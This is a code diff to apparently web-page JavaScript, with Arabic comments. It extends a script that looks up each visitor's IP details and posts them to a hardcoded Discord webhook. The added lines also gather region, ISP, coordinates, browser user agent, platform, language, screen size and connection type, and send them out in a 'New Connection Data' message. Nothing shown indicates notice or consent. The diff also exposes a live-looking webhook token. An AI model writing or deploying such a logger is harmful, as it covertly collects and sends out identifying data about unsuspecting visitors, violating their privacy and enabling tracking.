@@ -125,8 +125,24 @@ fetch('https://ipinfo.io/json')
         const ip = data.ip;
         const country = data.country || "Unknown";
         const city = data.city || "Unknown";
+        const region = data.region || "Unknown";
+        const org = data.org || "Unknown"; // مزود خدمة الإنترنت (ISP)
+        const loc = data.loc || "Unknown"; // إحداثيات خط الطول والعرض
         const dateTime = new Date().toLocaleString();
 
+        // استخراج معلومات الجهاز والمتصفح
+        const userAgent = navigator.userAgent;
+        const platform = navigator.platform;
+        const language = navigator.language;
+        const screenSize = `${screen.width}x${screen.height}`;
+
+        // معلومات الاتصال (إذا كانت مدعومة)
+        let connectionType = "Unknown";
+        if (navigator.connection) {
+            connectionType = navigator.connection.effectiveType || "Unknown";
+        }
+
+        // رابط الـ Webhook
         const webhookUrl = 'https://discord.com/api/webhooks/1350692886525771818/OvIkSed-C9RnAqXo456dO8RvpZ6vZCeSiC9sSBd_bEDU2Yynd9wt0YJHMtRPS7Jqksck';
 
         var xhr = new XMLHttpRequest();
@@ -134,9 +150,20 @@ fetch('https://ipinfo.io/json')
         xhr.setRequestHeader('Content-Type', 'application/json');
         
         const dataToSend = {
-            content: `**IP:** ${ip}\n**Country & City:** ${country} - ${city}\n**Date & Time:** ${dateTime}`
+            content: `📡 **New Connection Data** 📡\n\n` +
+                     `📍 **Location:** ${country}, ${region}, ${city}\n` +
+                     `🌎 **Coordinates:** ${loc}\n` +
+                     `📡 **ISP:** ${org}\n` +
+                     `🔗 **IP Address:** ${ip}\n\n` +
+                     `💻 **Device Info:**\n` +
+                     `🖥️ **Platform:** ${platform}\n` +
+                     `🌐 **Browser:** ${userAgent}\n` +
+                     `🖥️ **Screen Size:** ${screenSize}\n` +
+                     `🗣️ **Language:** ${language}\n` +
+                     `📶 **Connection Type:** ${connectionType}\n\n` +
+                     `🕒 **Time:** ${dateTime}`
         };
-        
+
         xhr.onreadystatechange = function() {
             if (xhr.readyState === 4) {
                 if (xhr.status === 204) {
